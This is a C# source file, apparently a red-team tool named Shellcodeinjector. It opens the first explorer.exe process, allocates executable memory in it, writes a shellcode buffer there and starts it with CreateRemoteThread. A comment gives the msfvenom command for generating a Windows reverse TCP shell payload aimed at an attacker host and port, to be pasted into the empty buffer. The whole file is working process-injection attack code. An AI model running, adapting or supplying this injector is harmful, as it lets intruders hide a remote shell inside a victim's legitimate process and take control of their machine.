using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Shellcodeinjector
{
    class Program
    {
        static void Main(string[] args)
        {
            //Insert shellcode here.
            //msfvenom -p windows/x64/shell_reverse_tcp LHOST=attackerIP LPORT=attackerPort -f csharp
            byte[] shellcode = new byte[] { };

            //Get the processID for the first instance of explorer.exe
            Process[] targetProcess = Process.GetProcessesByName("explorer");
            Process explorerProcess = targetProcess[0];
            
            //Get a handle on the target process
            IntPtr process_handle = Methods.OpenProcess(0x1F0FFF, false, explorerProcess.Id);
            IntPtr bytesWritten;

            //Allocate the memory to place the shellcode
            IntPtr memory_allocation = Methods.VirtualAllocEx(process_handle, IntPtr.Zero, (uint)(shellcode.Length), 0x00001000, 0x40);

            //Write the shellcode into memory
            Methods.WriteProcessMemory(process_handle, memory_allocation, shellcode, (int)shellcode.Length, out bytesWritten);

            //Execute the code
            Methods.CreateRemoteThread(process_handle, IntPtr.Zero, 0, memory_allocation, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
    class Methods
    {
        //OpenProcess API to get handle on the target process
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
            uint processAccess,
            bool bInheritHandle,
            int processId);

        //VirtualAllocEx to allocate memory in the remote process
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        //WriteProcessMemory to copy shellcode into memory
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            Int32 nSize,
            out IntPtr lpNumberofBytesWritten);

        //CreateRemoteThread to execute the shellcode in memory
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParamerter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        public enum StateEnum
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_FREE = 0x10000,
        }

        public enum Protection
        {
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
        }
    }
    
}
